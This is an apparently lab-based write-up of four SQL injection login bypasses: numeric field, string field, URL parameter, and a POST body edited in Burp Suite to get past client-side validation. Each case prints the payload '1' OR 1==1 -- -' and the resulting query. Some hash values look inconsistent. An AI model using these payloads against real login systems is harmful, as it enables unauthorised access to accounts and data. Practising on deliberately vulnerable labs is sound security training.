# SQL Injection 1:Input Box Non-string
- Uploaded a dummy data to the input box, and the query received was 

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=admin AND password = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```
- We can see that in the input box there is no sanitization and profileID is not a string. We can easily bypass this authentication with `1 OR 1==1-- -`

> 1 OR 1==1 : This statement will set code output to True
> -- - : This will comment out rest of the command


- The new SQL statement will be

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 OR 1==1 -- - AND password = 'c3aead0d0872ccceaf6cdd7d6229a69368ed71294d3098241aa6e53932698d18'
```


# SQL Injection 2: Input Box String
- Uploaded a dummy data to the input and the data received was 

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = 'admin' AND password = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```

- We can bypass this authentication with `1' OR 1==1 -- -`

> 1' : This statement will escape the parenthesis for profileID
> OR 1==1 : This will output query as True.
> -- - : This will comment out rest of the query

- New query will be

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' OR 1==1 -- -' AND password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

# SQL Injection 3: URL Injection
- When we add dummy data to the login page it responds with two parameters profileID and password. 

```console
http://10.10.171.219:5000/sesqli3/login?profileID=admin&password=admin
```
- The SQL query will be 

```SQL
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='admin' AND password='8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```

- Change user parameter to `1' OR 1==1 -- -` 

- New HTTP request will be

```console
http://10.10.171.219:5000/sesqli3/login?profileID=1'%20OR%201==1%20--%20-&password=admin
```
- New SQL query will be 

```SQL
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' OR 1==1 -- -' AND password='8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```

# SQL Injection 4: POST Injection

- We can see at the source code of the login page it does not allow special characters so we cannot add our SQL Injection command.

```javascript
function validateform() {
        var profileID = document.inputForm.profileID.value;
        var password = document.inputForm.password.value;

        if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
            alert("The input fields cannot contain special characters");
            return false;
        }
        if (profileID == null || password == null) {
            alert("The input fields cannot be empty.");
            return false;
        }
    }
```
- Start BurSuite and intercept the network.
- Add dummy data to the login page.
![Data intercepted from burpSuite](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/1.png)
- The Created SQL Query will be
```SQL
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='admin' AND password='8c6976e5b5410415bde9-8bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```
- Change Request Body Parameter for profileID to `1' OR 1==1 -- -`
![New data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/2.png)
- Now forward the request and you will be in.
- New SQL query will be 

```SQL
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' OR 1==1 -- -' AND password = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
```
